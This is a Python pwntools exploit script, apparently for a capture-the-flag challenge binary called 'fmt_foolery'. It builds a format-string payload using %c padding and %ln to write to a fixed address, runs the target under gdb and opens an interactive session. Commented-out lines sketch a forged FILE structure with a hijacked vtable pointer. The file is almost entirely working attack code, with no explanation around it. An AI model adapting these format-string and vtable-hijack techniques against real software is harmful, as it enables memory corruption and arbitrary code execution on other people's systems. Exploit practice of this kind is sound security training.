from pwn import *
import os

context.terminal = ["tmux", "splitw", "-h"]
context.arch = 'amd64'

# elf = ELF('./fmt_fun')
# libc = ELF('./libc.so.6')

#  %32c%47$ln
addr = 0x404040
payload = b'%c%c%c%c%c%c%c%4210712c%ln'
# payload = payload.ljust(0x30, b'\x00')
# vtable_addr = addr + len(payload)
# payload += flat([0]*7+[0xdeadbeef])
# payload += flat([
#     0x00000000fbad2887
# ]+[0]*26+[vtable_addr])

# io = gdb.debug('./fmt_foolery', 'b *(main+143)\nc', env={'LD_PRELOAD': './libc.so.6'})
io = gdb.debug('./fmt_foolery', 'b *(main+83)\nc')
# io = process('./fmt_foolery')
io.sendline(payload)
# io.clean(3)
# print(io.poll())
io.interactive()
